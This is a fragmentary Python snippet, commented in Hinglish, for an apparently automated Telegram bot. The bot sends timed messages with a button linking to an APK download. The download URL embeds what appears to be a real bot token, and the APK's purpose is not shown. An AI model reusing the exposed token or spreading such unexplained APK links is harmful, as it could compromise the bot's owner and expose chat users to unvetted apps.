...
# 👇 Direct Download Link set kar diya hai
DIRECT_DOWNLOAD_LINK = "https://api.telegram.org/file/bot8772389822:AAGEoR5Uh17IYRJ29AsQoH6SSfOnC8aSbeI/documents/file_0.apk" 
...
# Sequence worker with 10s intervals and direct download link button
def send_automated_sequence(chat_id):
    def worker():
        try:
            # 1. Start hone ke 10 second baad video message
            time.sleep(10.0)
            
            # Button setup with Direct Download Link
            ...
            # 2. Video ke 10 second baad follow-up message
            time.sleep(10.0)
